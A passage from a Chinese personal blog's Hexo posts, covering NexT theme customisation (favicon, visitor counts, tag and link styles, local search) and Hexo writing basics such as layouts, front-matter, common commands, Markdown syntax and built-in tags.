<figure class="highlight yml"><figcaption><span>themes/next/_config.yml</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="attr">favicon:</span></span><br><span class="line">  <span class="attr">small:</span> <span class="string">/images/16x16.png</span></span><br><span class="line">  <span class="attr">medium:</span> <span class="string">/images/32x32.png</span></span><br><span class="line">  <span class="attr">apple_touch_icon:</span> <span class="string">/images/128x128.png</span></span><br><span class="line">  <span class="attr">safari_pinned_tab:</span> <span class="string">/images/star.svg</span></span><br><span class="line">  <span class="comment">#android_manifest: /images/manifest.json</span></span><br><span class="line">  <span class="comment">#ms_browserconfig: /images/browserconfig.xml</span></span><br></pre></td></tr></table></figure>

<p><img src="/images/icon.png" alt="图标效果预览"></p>
<h3 id="添加数据统计"><a href="#添加数据统计" class="headerlink" title="添加数据统计"></a>添加数据统计</h3><p>不蒜子统计的引入很好的方便了设置阅读次数和访客数，可以在 <span class="label success">主题配置文件</span> 中进行如下设置：</p>
<figure class="highlight yml"><figcaption><span>themes/next/_config.yml</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="attr">busuanzi_count:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span>     <span class="comment"># false，是否开启不蒜子统计功能</span></span><br><span class="line">  <span class="attr">total_visitors:</span> <span class="literal">false</span>     <span class="comment"># true，是否开启总访客数统计   </span></span><br><span class="line">  <span class="attr">total_visitors_icon:</span> <span class="string">fa</span> <span class="string">fa-user</span></span><br><span class="line">  <span class="attr">total_views:</span> <span class="literal">false</span>      <span class="comment"># true，是否开启总访问量统计</span></span><br><span class="line">  <span class="attr">total_views_icon:</span> <span class="string">fa</span> <span class="string">fa-eye</span></span><br><span class="line">  <span class="attr">post_views:</span> <span class="literal">true</span>      <span class="comment"># 是否开启文章阅读量统计</span></span><br><span class="line">  <span class="attr">post_views_icon:</span> <span class="string">fa</span> <span class="string">fa-eye</span></span><br></pre></td></tr></table></figure>

<p><img src="/images/postview.png" alt="文章阅读量效果预览"></p>
<h3 id="修改标签样式"><a href="#修改标签样式" class="headerlink" title="修改标签样式"></a>修改标签样式</h3><p>对于博客文章底部的标签样式默认为 <code>#tag</code> ，我们可以将其改成标签图标样式，打开模板 <code>themes/next/layout/_macro/post.swig</code> ，搜索 <code>rel=&quot;tag&quot;&gt;#</code> ，将 <code>#</code> 换成 <code>&lt;i class=&quot;fa fa-tag&quot;&gt;&lt;/i&gt;</code> 就可以了：</p>
<figure class="highlight plaintext"><figcaption><span>themes/next/layout/_macro/post.swig</span></figcaption><table><tr><td class="code"><pre><span class="line">&lt;div class=&quot;post-tags&quot;&gt;</span><br><span class="line">    &#123;%- for tag in post.tags.toArray() %&#125;</span><br><span class="line">        &lt;a href=&quot;&#123;&#123; url_for(tag.path) &#125;&#125;&quot; rel=&quot;tag&quot;&gt; &lt;i class=&quot;fa fa-tag&quot;&gt;&lt;/i&gt; &#123;&#123; tag.name &#125;&#125;&lt;/a&gt; </span><br><span class="line">    &#123;%- endfor %&#125;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/images/label.png" alt="标签效果预览"></p>
<h3 id="修改链接样式"><a href="#修改链接样式" class="headerlink" title="修改链接样式"></a>修改链接样式</h3><p>文章中的超链接样式也是可以通过文件来修改的，在 <code>themes/next/source/css/_common/components/post/post.styl</code> 文件末尾添加如下css样式：</p>
<figure class="highlight styl"><figcaption><span>themes/next/source/css/_common/components/post/post.styl</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="comment">// 文章内链接文本样式</span></span><br><span class="line"><span class="selector-class">.post-body</span> <span class="selector-tag">p</span> a&#123;</span><br><span class="line">  <span class="attribute">color</span>: <span class="number">#0593d3</span>;</span><br><span class="line">  <span class="attribute">border-bottom</span>: none;</span><br><span class="line">  <span class="attribute">border-bottom</span>: <span class="number">1px</span> solid <span class="number">#0593d3</span>;</span><br><span class="line">  <span class="selector-pseudo">&amp;:hover</span> &#123;</span><br><span class="line">    <span class="attribute">color</span>: <span class="number">#fc6423</span>;</span><br><span class="line">    <span class="attribute">border-bottom</span>: none;</span><br><span class="line">    <span class="attribute">border-bottom</span>: <span class="number">1px</span> solid <span class="number">#fc6423</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/images/link1.png" alt="链接效果预览"> <img src="/images/link2.png" alt="链接效果预览"></p>
<h3 id="文章目录设置"><a href="#文章目录设置" class="headerlink" title="文章目录设置"></a>文章目录设置</h3><p>可以在 <span class="label success">主题配置文件</span> 中设置文章目录不自动生成并显示数字（可以自己添加）：</p>
<figure class="highlight yml"><figcaption><span>themes/next/_config.yml</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="attr">toc:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="comment"># Automatically add list number to toc.</span></span><br><span class="line">  <span class="attr">number:</span> <span class="literal">false</span>   <span class="comment"># true</span></span><br></pre></td></tr></table></figure>

<div class="note info">
            <p><i class="fa fa-info-circle"></i> 写文章时标题跨级否则取消自动生成数字标号后显示会错乱（一级标题后必须跟二级标题，二级标题后必须跟三级标题，以此类推）</p>
          </div>

<h3 id="添加文章结束标志"><a href="#添加文章结束标志" class="headerlink" title="添加文章结束标志"></a>添加文章结束标志</h3><p>为了使得文章页面更美观，还可以为其设置一个文章结束标志，以此为分界线。在路径 <code>themes/next/layout/_macro</code> 中新建 <code>passage-end-tag.swig</code> 文件，并添加以下内容：</p>
<figure class="highlight plaintext"><figcaption><span>themes/next/layout/_macro/passage-end-tag.swig</span></figcaption><table><tr><td class="code"><pre><span class="line">&lt;div&gt;</span><br><span class="line">    &#123;% if not is_index %&#125;</span><br><span class="line">        &lt;div style=&quot;text-align:center;color: #ccc;font-size:14px;&quot;&gt;------------- &lt;i class=&quot;fa fa-paw&quot;&gt;&lt;/i&gt; 本文结束感谢您的阅读 &lt;i class=&quot;fa fa-paw&quot;&gt;&lt;/i&gt; -------------&lt;/div&gt;</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure>
<p>接着打开 <code>themes/next/layout/_macro/post.swig</code> 文件，在 <code>post-body</code> 之后( <code>END POST BODY</code> )， <code>post-footer</code> 之前添加如下代码：</p>
<figure class="highlight plaintext"><figcaption><span>themes/next/layout/_macro/post.swig</span></figcaption><table><tr><td class="code"><pre><span class="line">&lt;div&gt;</span><br><span class="line">    &#123;% if not is_index %&#125;</span><br><span class="line">        &#123;% include &#x27;passage-end-tag.swig&#x27; %&#125;</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure>

<p>最后打开 <span class="label success">主题配置文件</span> 在末尾添加：</p>
<figure class="highlight yml"><figcaption><span>themes/next/_config.yml</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="comment"># 文章末尾添加“本文结束”标记</span></span><br><span class="line"><span class="attr">passage_end_tag:</span></span><br><span class="line">  <span class="attr">enabled:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure>

<p><img src="/images/thanksline.png" alt="结束标志效果预览"></p>
<h3 id="添加文章版权信息"><a href="#添加文章版权信息" class="headerlink" title="添加文章版权信息"></a>添加文章版权信息</h3><p>很多人是自己手动写入的文件来添加文章版权信息，为了方便也可以直接在 <span class="label success">主题配置文件</span> 中开启博客的版权功能：</p>
<figure class="highlight yml"><figcaption><span>themes/next/_config.yml</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="attr">creative_commons:</span></span><br><span class="line">  <span class="attr">license:</span> <span class="string">by-nc-sa</span></span><br><span class="line">  <span class="attr">sidebar:</span> <span class="literal">false</span>    <span class="comment"># true，侧边栏显示版权©️</span></span><br><span class="line">  <span class="attr">post:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">language:</span></span><br></pre></td></tr></table></figure>

<p><img src="/images/copyright.png" alt="版权信息效果预览"></p>
<h3 id="添加图片放大功能"><a href="#添加图片放大功能" class="headerlink" title="添加图片放大功能"></a>添加图片放大功能</h3><p>针对文章中的图片可能看不清的情况，可以在 <span class="label success">主题配置文件</span> 中找到 <code>fancybox</code> 字段并更改参数：</p>
<figure class="highlight yml"><figcaption><span>themes/next/_config.yml</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="attr">fancybox:</span> <span class="literal">true</span>   <span class="comment"># false</span></span><br></pre></td></tr></table></figure>

<h3 id="开启本地搜索功能"><a href="#开启本地搜索功能" class="headerlink" title="开启本地搜索功能"></a>开启本地搜索功能</h3><p>该功能由 <code>hexo-generator-searchdb</code> 提供，效果如下图：</p>
<p><img src="/images/search.png" alt="本地搜索效果预览"><br>首先需要在根目录下执行以下命令来安装相关依赖：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install hexo-generator-searchdb --save</span><br></pre></td></tr></table></figure>

<p>然后在 <span class="label success">主题配置文件</span> 中修改相关 <code>local_search</code> 字段：</p>
<figure class="highlight yml"><figcaption><span>themes/next/_config.yml</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="attr">local_search:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span>    <span class="comment"># false</span></span><br><span class="line">  <span class="attr">trigger:</span> <span class="string">auto</span>    <span class="comment"># 每次输入改变都执行搜索</span></span><br><span class="line">  <span class="attr">top_n_per_article:</span> <span class="number">3</span>    <span class="comment"># 1， 每篇文章显示的搜索结果数量，如果要显示所有结果可设置为-1</span></span><br><span class="line">  <span class="attr">unescape:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">preload:</span> <span class="literal">false</span></span><br></pre></td></tr></table></figure>

<p>在 <span class="label warning">站点配置文件</span> 中添加以下字段：</p>
<figure class="highlight yml"><figcaption><span>_config.yml</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="attr">search:</span></span><br><span class="line">  <span class="attr">path:</span> <span class="string">search.xml</span></span><br><span class="line">  <span class="attr">field:</span> <span class="string">post</span> <span class="comment"># 指定搜索范围，可选 post | page | all</span></span><br><span class="line">  <span class="attr">format:</span> <span class="string">html</span> <span class="comment"># 指定页面内容形式，可选 html | raw (Markdown) | excerpt | more</span></span><br><span class="line">  <span class="attr">limit:</span> <span class="number">10000</span></span><br></pre></td></tr></table></figure>


<hr>
<h4> 参考链接 </h4>

<ol>
<li><a href="http://theme-next.iissnan.com/getting-started.html">NexT 使用文档</a></li>
<li><a href="https://blog.csdn.net/nightmare_dimple/article/details/86661502?utm_medium=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-4.control&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-4.control">Hexo 博客优化之Next 主题美化 - CSDN博客</a></li>
<li><a href="https://blog.csdn.net/qq_39085060/article/details/103831291">Hexo next 主题博客搭建及美化 - CSDN博客</a></li>
<li><a href="http://yearito.cn/posts/hexo-advanced-settings.html">Hexo 搭建个人博客系列：进阶设置篇 - Yearito’s Blog</a></li>
</ol>
]]></content>
      <categories>
        <category>博客</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
        <tag>Blog</tag>
      </tags>
  </entry>
  <entry>
    <title>Hexo博客搭建之写作技巧</title>
    <url>/2021/08/04/Hexo%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E4%B9%8B%E5%86%99%E4%BD%9C%E6%8A%80%E5%B7%A7/</url>
    <content><![CDATA[<p>本文介绍 Hexo 博客的写作格式规范。</p>
<p>第一章中介绍了 Hexo 中写作相关的基本概念，包括基本介绍、三种布局、标签与分类、以及如何上传博客。</p>
<p>第二章中介绍了一些基本的 Markdown 写作语法 和 Hexo 常用命令。</p>
<p>第三章中介绍了 Hexo 中常用的内置标签，包括 note 标签、label 标签、button 标签、tab 标签以及代码块的高级用法，通过使用写作标签可以快速编写样式丰富的文档片段。</p>
<p>第四章中介绍了几款优雅实用的 Markdown 写作工具。</p>
<h2 id="开始写作"><a href="#开始写作" class="headerlink" title="开始写作"></a>开始写作</h2><p>本章先做一些基本概念的介绍，这样会利于理解最后的如何发表文章（命令）。</p>
<h3 id="基本介绍"><a href="#基本介绍" class="headerlink" title="基本介绍"></a>基本介绍</h3><p>首先要熟悉我们本地的hexo文件夹包括哪些内容，每个文件夹的存储内容及其作用。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">.</span><br><span class="line">└───  本地hexo目录</span><br><span class="line">   ├──  public            // 存放上传部署于GitHub上的文件（即显示为博客内面内容的html文件们）</span><br><span class="line">   ├──  source            // 存放要发表的各个页面原md文件</span><br><span class="line">     ├──  _posts          // 已经发表的md文件原稿</span><br><span class="line">     ├──  _drafts         // 等待发表的md文件草稿</span><br><span class="line">     ├──  about           // about 页面（包含index.md文件）</span><br><span class="line">     ├──  tags            // tags 页面</span><br><span class="line">     ├──  categories      // categories 页面</span><br><span class="line">     └──  404             // 404公益 页面</span><br><span class="line">   ├──  themes            // 存放各主题文件夹</span><br><span class="line">      ├── landscape       // 默认landscape主题</span><br><span class="line">      └──  next           // 当前所使用Next主题，next文件夹下的_config.yml就是next主题的配置文件</span><br><span class="line">   ├──  scaffolds         // 存放各默认模版的设置文件</span><br><span class="line">      ├──  _draft.md</span><br><span class="line">      ├──  _post.md</span><br><span class="line">      └──  _page.md</span><br><span class="line">   └──  _config.yml       // 博客网站配置文件</span><br><span class="line">     ...</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="三种布局"><a href="#三种布局" class="headerlink" title="三种布局"></a>三种布局</h3><p>Hexo 默认有三种布局：<code>post</code> 、 <code>page</code> 和 <code>draft</code> ，用户可以通过 <code>scaffolds</code> 目录下的md文档来自定义布局格式，还可以通过修改站点配置文件 <code>_config.yml</code> 中的 <code>default_layout</code> 参数（<code>post</code> 、 <code>page</code> 或 <code>draft</code>）来指定生成文档时的默认布局。</p>
<p>由于考虑到一些文章可能需要数天才能完成，这里建议将新建文档时的默认布局设置为 <code>draft</code> ：</p>
<figure class="highlight plaintext"><figcaption><span>_config.yml</span></figcaption><table><tr><td class="code"><pre><span class="line">default_layout: draft</span><br></pre></td></tr></table></figure>

<ul>
<li>文章（post）</li>
</ul>
<p>基于 <code>post</code> 布局生成的文档存在于 <code>source/_posts</code> 目录下，该目录下的文档会作为博客正文显示在网站中。</p>
<ul>
<li>草稿（draft）</li>
</ul>
<p><code>draft</code> 布局用于创建草稿，生成的文档存在于 <code>source/_drafts</code> 目录中，默认配置下将不会把该目录下的文档渲染到网站中。</p>
<p>由于我更改了默认布局设置为 <code>draft</code> ，新建的文档需要通过以下命令将草稿发布为正式文章：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo publish title</span><br></pre></td></tr></table></figure>
<p>这时 <code>_drafts</code> 里的 <code>title.md</code> 跑到了 <code>_posts</code> 文件夹里，也就说明草稿发布成功了。</p>
<ul>
<li>页面（page）</li>
</ul>
<p><code>page</code> 布局用于生成类似 <strong>首页</strong> 、 <strong>归档</strong> 、 <strong>标签</strong> 、 <strong>关于</strong> 这样的页面。</p>
<p>想要新建 <code>page</code> 类页面可以使用命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo new page aa</span><br></pre></td></tr></table></figure>
<p>与前两种布局不同，这个命令会在 <code>source</code> 文件夹内创建出 <code>aa</code> 文件夹，与 <code>_posts</code> ， <code>_drafts</code> 文件夹并列，文件夹里面有一个index.md文件即为该页面所显示内容。</p>
<p>输入网址 <code>https://xinkjung.github.io/aa/</code> 就能看到该页面了。</p>
<h3 id="标签与分类"><a href="#标签与分类" class="headerlink" title="标签与分类"></a>标签与分类</h3><p>标签和分类都是用于对文章进行归档的一种方式，标签是一种列表结构，而分类是一种树结构。我们以人作为例子，从标签的角度考虑，我可以拥有程序员、甜妹、可爱等标签，这些标签之间没有层级关系；从分类的角度考虑，我是亚洲人、中国人、北京人，这些分类之间是有明确的包含关系的。</p>
<p>可以在 <code>Front-Matter</code> 中添加 <code>catergories</code> 和 <code>tags</code> 字段为文章添加标签和分类，结构如下：</p>
<figure class="highlight plaintext"><figcaption><span>title.md</span></figcaption><table><tr><td class="code"><pre><span class="line">tags: [标签]</span><br><span class="line">categories:</span><br><span class="line">	- 分类</span><br><span class="line">description: 简介</span><br></pre></td></tr></table></figure>

<h3 id="上传博客"><a href="#上传博客" class="headerlink" title="上传博客"></a>上传博客</h3><p>一般完整格式为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">title: postName               # 文章页面上的显示名称，一般是中文</span><br><span class="line">date: 2013-12-02 15:30:16     # 文章生成时间，一般不改，当然也可以任意修改</span><br><span class="line">categories:                   # 分类</span><br><span class="line">  - 分类         </span><br><span class="line">  - 子分类           </span><br><span class="line">tags: [tag1,tag2,tag3]        # 文章标签，可空，多标签请用格式，注意冒号后面有个空格</span><br><span class="line">description: 附加一段文章摘要，字数最好在140字以内，会出现在meta的description里面</span><br><span class="line">---</span><br><span class="line"></span><br><span class="line">以下是正文...</span><br></pre></td></tr></table></figure>

<blockquote>
<p>新建文章</p>
</blockquote>
<p>在hexo所在目录下，打开terminal，在命令行输入：<br>（windows-&gt;文件夹目录下右键-&gt;Git Bash Here，Mac-&gt;选中文件夹右键-&gt;服务-&gt;新建位于文件夹位置的终端窗口）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo new &quot;title&quot;</span><br></pre></td></tr></table></figure>
<p>会生成一个title.md文档存放于 <code>source/_posts</code> 目录下（默认<code>post</code>布局），title即为文章标题，然后就可以使用markdown语法对其进行编辑啦。</p>
<p>由于我设置的默认布局为 <code>draft</code> ，需要先将草稿发布为正式文章：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo publish title</span><br></pre></td></tr></table></figure>

<p>我们可以通过修改 <code>scaffolds</code> 中的几个 md 文件，来修改其对应的模版，比如修改 <code>draft.md</code> 文件如下，此后新生成文章时，会自带 <code>title</code> 及 <code>date</code> 内容， <code>tags</code> 、  <code>categories</code> 、 <code>description</code> 这些属性，就不用再每次手动添加了。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">title: &#123;&#123; title &#125;&#125;</span><br><span class="line">date: &#123;&#123;date&#125;&#125;</span><br><span class="line">tags: </span><br><span class="line">categories: </span><br><span class="line">description: </span><br><span class="line">---</span><br></pre></td></tr></table></figure>

<blockquote>
<p>上传部署</p>
</blockquote>
<p>同理，hexo所在目录下，打开terminal，在命令行输入：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo s -g</span><br></pre></td></tr></table></figure>
<p>出现 <code>&#39;INFO   Hexo is running at https://localhost:4000. Press Ctrl + C to stop.&#39;</code> 即可进入网页进行预览,然后再执行命令:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo d</span><br></pre></td></tr></table></figure>
<p>无报错后登陆网站查看就可以看到新博文已经发表成功啦！！！</p>
<div class="note info">
            <p><i class="fa fa-info-circle"></i> 如果出现预览成功但最后网页显示不成功的情况可以先用 hexo clean 清楚缓存，再进行部署</p>
          </div>

<h2 id="语法与命令"><a href="#语法与命令" class="headerlink" title="语法与命令"></a>语法与命令</h2><h3 id="Markdown-基本语法"><a href="#Markdown-基本语法" class="headerlink" title="Markdown 基本语法"></a>Markdown 基本语法</h3><table>
<thead>
<tr>
<th>元素</th>
<th>Markdown语法</th>
<th>效果预览</th>
</tr>
</thead>
<tbody><tr>
<td>标题</td>
<td><code># 标题1</code> <br><code>## 标题2</code> <br><code>### 标题3</code></td>
<td># 标题1 <br>## 标题2  <br>### 标题3</td>
</tr>
<tr>
<td>文字加粗</td>
<td><code>**文字加粗**</code></td>
<td><strong>文字加粗</strong></td>
</tr>
<tr>
<td>字体倾斜</td>
<td><code>*斜体*</code> 或 <code>_斜体_</code></td>
<td><em>斜体</em> 或 <em>斜体</em></td>
</tr>
<tr>
<td>加粗斜体</td>
<td><code>***加粗斜体***</code></td>
<td><em><strong>加粗斜体</strong></em></td>
</tr>
<tr>
<td>删除线</td>
<td><code>~~删除线~~</code></td>
<td><del>删除线</del></td>
</tr>
<tr>
<td>引用/区块</td>
<td><code>&gt; 引用</code></td>
<td>&gt; 引用</td>
</tr>
<tr>
<td>有序列表</td>
<td><code>1. 第一项</code> <br><code>2. 第二项</code> <br><code>3. 第三项\</code></td>
<td>1. 第一项 <br>2. 第二项 <br>3. 第三项</td>
</tr>
<tr>
<td>无序列表</td>
<td><code>- 第一项</code> <br><code>+ 第二项</code> <br><code>* 第三项</code></td>
<td>- 第一项 <br>+ 第二项 <br>* 第三项</td>
</tr>
<tr>
<td>超链接</td>
<td><code>[关于我](URL)</code></td>
<td><a href="https://xinkjung.github.io/about">关于我</a></td>
</tr>
<tr>
<td>插入图片</td>
<td><code>![图片](url)</code></td>
<td><img src="/images/icon_photo.png" alt="图片"></td>
</tr>
<tr>
<td>水平线</td>
<td><code>---</code></td>
<td>—</td>
</tr>
<tr>
<td>换行</td>
<td><code>&lt;br&gt;</code></td>
<td><br></td>
</tr>
<tr>
<td>代码</td>
<td><code>`code`</code></td>
<td><code>code</code></td>
</tr>
<tr>
<td>代码块</td>
<td><code>```code snippet```</code></td>
<td><code>code snippet</code></td>
</tr>
<tr>
<td>插入图标</td>
<td><code>&lt;i class=&quot;fa fa-bolt&quot;&gt;&lt;/i&gt;</code></td>
<td><i class="fa fa-bolt"></i></td>
</tr>
</tbody></table>
<p>关于插入图片的 url 地址，有三种不同路径链接：</p>
<ul>
<li>src 链接：直接复制图片的 <code>src 链接</code> 为 <code>url</code> 即可</li>
<li>本地绝对路径：图片统一放在 <code>source/images</code> 文件夹中，<code>url</code> 为 <code>/images/name.jpg</code></li>
<li>本地相对路径：将 <code>_config.yml</code> 文件中的配置项 <code>post_asset_folder</code> 设为 <code>true</code> 后，新建文章时会自动在 <code>source/_posts</code> 中会生成文章 <code>post_name.md</code> 和同名文件夹 <code>post_name</code> ，将图片资源放在文章自己的目录 <code>post_name</code> 中，文章就可以使用相对路径引用图片资源了，这时 <code>url</code> 为 <code>name.jpg</code></li>
</ul>
<p>插入的图标皆为 <a href="http://www.fontawesome.com.cn/">FontAwesome图标</a> 库中的，将代码 <code>fa fa-bolt</code> 替换为对应图标名称即可。</p>
<span class="label [info]">基于Hexo实现的博客，在文章中插入`<span id="more"></span>`标记即可实现部分首页显示</span>

<h3 id="Hexo-常用命令"><a href="#Hexo-常用命令" class="headerlink" title="Hexo 常用命令"></a>Hexo 常用命令</h3><blockquote>
<p>基本命令</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ hexo new &quot;postName&quot;          # 新建文章 </span><br><span class="line">$ hexo new page &quot;pageName&quot;     # 新建页面 </span><br><span class="line">$ hexo generate                # 生成静态页面至public目录 </span><br><span class="line">$ hexo server                  # 开启预览访问端口（默认4000，&#x27;ctrl+c&#x27;关闭server） </span><br><span class="line">$ hexo deploy                  # 部署到Github，上传 </span><br><span class="line">$ hexo help                    # 查看帮助 </span><br><span class="line">$ hexo version                 # 查看hexo版本</span><br><span class="line">$ hexo clean                   # 清楚缓存</span><br></pre></td></tr></table></figure>

<blockquote>
<p>命令缩写 </p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ hexo n == hexo new </span><br><span class="line">$ hexo g == hexo generate </span><br><span class="line">$ hexo s == hexo server </span><br><span class="line">$ hexo d == hexo deploy</span><br></pre></td></tr></table></figure>

<blockquote>
<p>组合命令</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ hexo s -g         # 生成并本地预览 </span><br><span class="line">$ hexo d -g         # 生成并上传 </span><br><span class="line">$ hexo s --debug    # 进入调试模式</span><br></pre></td></tr></table></figure>

<h2 id="Hexo-内置标签"><a href="#Hexo-内置标签" class="headerlink" title="Hexo 内置标签"></a>Hexo 内置标签</h2><div class="note info">
            <p><i class="fa fa-info-circle"></i>  标签内的可变参数均用 [] 括起来了，实际使用时去掉括号填写对应参数即可</p>
          </div>

<h3 id="文本居中"><a href="#文本居中" class="headerlink" title="文本居中"></a>文本居中</h3><p>一般在引用单行文本时使用，如作为文章开篇题词。居中标签效果如下：</p>
<blockquote class="blockquote-center">
            <i class="fa fa-quote-left"></i>
            <p>面朝大海 春暖花开 </p>

            <i class="fa fa-quote-right"></i>
          </blockquote>

<p>可以通过以下几种方式使用该标签：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. HTML方式: 直接在 Markdown 文件中编写 HTML 来调用, 其中  class=&quot;blockquote-center&quot; 是必须的 :</span><br><span class="line"> &lt;blockquote class=&quot;blockquote-center&quot;&gt;blah blah blah&lt;/blockquote&gt;</span><br><span class="line"></span><br><span class="line">2. 标签方式 :</span><br><span class="line">&#123;% centerquote %&#125;blah blah blah&#123;% endcenterquote %&#125;</span><br><span class="line"></span><br><span class="line">1. 标签别名 :</span><br><span class="line">&#123;% cq %&#125; blah blah blah &#123;% endcq %&#125;</span><br></pre></td></tr></table></figure>

<p>发现软件预览效果与网页预览效果实际不同，最后以实际网页预览测试为准。</p>
<h3 id="代码块进阶"><a href="#代码块进阶" class="headerlink" title="代码块进阶"></a>代码块进阶</h3><p>可以通过为代码块附加参数的形式为其添加更丰富的信息提示，效果如下：</p>
<figure class="highlight python"><figcaption><span>Hello World.py</span></figcaption><table><tr><td class="code"><pre><span class="line">printf(<span class="string">&quot;Hello World!&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>代码块进阶语法规则：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. 三个反引号：</span><br><span class="line">``` [language] [title] [url] [link text]</span><br><span class="line">code snippet </span><br><span class="line">``` `</span><br><span class="line">2. 标签方式（或简写为code）：</span><br><span class="line">&#123;% codeblock [title] [lang:language] [url] [link text] %&#125;</span><br><span class="line">code snippet</span><br><span class="line">&#123;% endcodeblock %&#125;</span><br></pre></td></tr></table></figure>

<p>其中，各参数意义如下：</p>
<ul>
<li>langugae：语言名称，引导渲染引擎正确解析并高亮显示关键字</li>
<li>title：代码块标题，将会显示在左上角</li>
<li>url：链接地址，如果没有指定 link text 则会在右上角显示 link</li>
<li>link text：链接名称，指定 url 后有效，将会显示在右上角</li>
</ul>
<p>url 必须为有效链接地址才会以链接的形式显示在右上角，否则将作为标题显示在左上角。以 url 为分界，左侧除了第一个单词会被解析为 language，其他所有单词都会被解析为 title，而右侧的所有单词都会被解析为 link text。</p>
<p>ps: 如果不想填写 title，可以在 language 和 url 之间添加至少三个空格。</p>
<p>可以在站点配置文件中设置 <code>highlight.auto_detect</code> 参数来开启自动语言检测高亮:</p>
<figure class="highlight diff"><figcaption><span>_config.yml</span></figcaption><table><tr><td class="code"><pre><span class="line">highlight:</span><br><span class="line">   enable: true</span><br><span class="line">   line_number: false</span><br><span class="line"><span class="deletion">-  auto_detect: false</span></span><br><span class="line"><span class="addition">+  auto_detect: true</span></span><br><span class="line">   tab_replace:</span><br></pre></td></tr></table></figure>

<p>如果设置语言为 diff，可以在代码前添加 <code>+</code> 和 <code>-</code> 来使用如上所示的高亮增删行提示效果，在展示代码改动痕迹时比较实用。</p>
<h3 id="note-标签"><a href="#note-标签" class="headerlink" title="note 标签"></a>note 标签</h3><p>通过 note 标签可以为段落添加背景色，语法如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% note [class] %&#125;</span><br><span class="line">文本内容 (支持行内标签)</span><br><span class="line">&#123;% endnote %&#125;</span><br></pre></td></tr></table></figure>

<p>支持的 <code>class</code> 种类包括 <code>default</code> 、 <code>primary</code> 、 <code>success</code> 、 <code>info</code> 、 <code>warning</code> 、 <code>danger</code>，也可以不指定 class ，各种效果及使用示例如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% note primary %&#125; **primary** note tag &#123;% endnote %&#125; </span><br></pre></td></tr></table></figure>

<div class="note primary">
            <p><strong>primary</strong> note tag </p>
          </div> 

<div class="note success">
            <p><strong>success</strong> note tag </p>
          </div> 

<div class="note info">
            <p><strong>info</strong> note tag </p>
          </div> 

<div class="note warning">
            <p><strong>warning</strong> note tag </p>
          </div> 

<div class="note danger">
            <p><strong>danger</strong> note tag </p>
          </div> 

<div class="note default">
            <p>undefined class note tag （default）</p>
          </div>

<p>更多配置可在主题配置文件中设置:</p>
<figure class="highlight yml"><figcaption><span>themes\next\_config.yml</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="attr">note:</span></span><br><span class="line">  <span class="comment"># Note 标签样式预设</span></span><br><span class="line">  <span class="attr">style:</span> <span class="string">modern</span>  <span class="comment"># simple | modern | flat | disabled</span></span><br><span class="line">  <span class="attr">icons:</span> <span class="literal">false</span>  <span class="comment"># 是否显示图标</span></span><br><span class="line">  <span class="attr">border_radius:</span> <span class="number">3</span>  <span class="comment"># 圆角半径</span></span><br><span class="line">  <span class="attr">light_bg_offset:</span> <span class="number">0</span>  <span class="comment"># 默认背景减淡效果，以百分比计算</span></span><br></pre></td></tr></table></figure>

<h3 id="label-标签"><a href="#label-标签" class="headerlink" title="label 标签"></a>label 标签</h3><p>通过 label 标签可以为文字添加背景色，语法如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% label [class]@text  %&#125;</span><br></pre></td></tr></table></figure>
<p>支持的 <code>class</code> 种类包括 <code>default</code> 、 <code>primary</code> 、 <code>success</code> 、 <code>info</code> 、  <code>warning</code> 、 <code>danger</code>，默认使用 <code>default</code> 作为缺省。</p>
<p>使用示例如下：</p>
